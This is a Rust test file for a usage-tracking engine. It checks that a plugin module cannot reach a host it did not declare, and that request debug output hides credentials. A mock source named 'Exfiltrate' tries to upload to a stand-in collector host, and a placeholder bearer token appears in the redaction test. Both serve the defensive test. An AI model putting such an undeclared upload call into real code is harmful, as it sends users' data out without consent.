//! Engine seam: a misbehaving module asks the host client for a host it never declared.
//! The request must never reach the transport, and the failure shows as a problem.

use std::sync::Arc;

use uqt_core::contract::{Assistant, FetchContext, FetchError, FetchOutput, Intervals, Source};
use uqt_core::engine::{Engine, minutes};
use uqt_core::http::{HttpError, HttpRequest};
use uqt_core::model::{AccountInfo, BadgeSpec, Exactness, MeterKey};
use uqt_core::testing::RecordingTransport;
use uqt_core::time::{FakeClock, Timestamp};

struct Sneaky;

impl Assistant for Sneaky {
    fn id(&self) -> &'static str {
        "sneaky"
    }
    fn display_name(&self) -> &str {
        "Sneaky"
    }
    fn allowed_hosts(&self) -> &[&'static str] {
        &["api.declared.example"]
    }
    fn badge(&self) -> BadgeSpec {
        BadgeSpec {
            svg: "",
            letters: "S",
            color: "#000000",
        }
    }
    fn suggested_featured(&self) -> Vec<MeterKey> {
        Vec::new()
    }
    fn usage_page(&self) -> Option<&str> {
        None
    }
    fn discover_accounts(&mut self) -> Vec<AccountInfo> {
        vec![AccountInfo {
            id: "a".into(),
            display_name: "A".into(),
        }]
    }
    fn sources(&mut self, _account: &AccountInfo) -> Vec<Box<dyn Source>> {
        vec![Box::new(Exfiltrate)]
    }
}

struct Exfiltrate;

impl Source for Exfiltrate {
    fn id(&self) -> &str {
        "exfiltrate"
    }
    fn display_name(&self) -> &str {
        "Exfiltrate"
    }
    fn exactness(&self) -> Exactness {
        Exactness::Exact
    }
    fn priority(&self) -> u32 {
        0
    }
    fn intervals(&self) -> Intervals {
        Intervals {
            active: minutes(5),
            idle: minutes(15),
        }
    }
    fn fetch(&mut self, ctx: &FetchContext<'_>) -> Result<FetchOutput, FetchError> {
        match ctx
            .http
            .get("https://collector.undeclared.example/upload", &[])
        {
            Err(HttpError::HostNotAllowed(host)) => Err(FetchError::Other(host)),
            other => panic!("the host client let it through: {other:?}"),
        }
    }
}

#[test]
fn a_module_cannot_reach_a_host_it_did_not_declare() {
    let transport = RecordingTransport::new();
    let clock = FakeClock::new(Timestamp::from_utc(2026, 10, 29, 12, 0, 0));
    let mut engine = Engine::new(
        vec![Box::new(Sneaky)],
        Arc::new(clock.clone()),
        Arc::new(transport.clone()),
    );
    assert!(engine.tick());
    assert!(transport.requests().is_empty());
    let problem = engine.state().assistants[0].accounts[0]
        .problem
        .clone()
        .expect("the refusal is reported");
    assert_eq!(
        problem.error,
        FetchError::Other("collector.undeclared.example".into())
    );
}

#[test]
fn request_debug_output_never_shows_credentials() {
    let request = HttpRequest {
        method: "GET".into(),
        url: "https://api.declared.example/usage".into(),
        headers: vec![
            ("Authorization".into(), "Bearer sk-ant-oat01-secret".into()),
            ("anthropic-beta".into(), "oauth-2025-04-20".into()),
        ],
    };
    let shown = format!("{request:?}");
    assert!(!shown.contains("secret"), "{shown}");
    assert!(shown.contains("oauth-2025-04-20"), "{shown}");
}
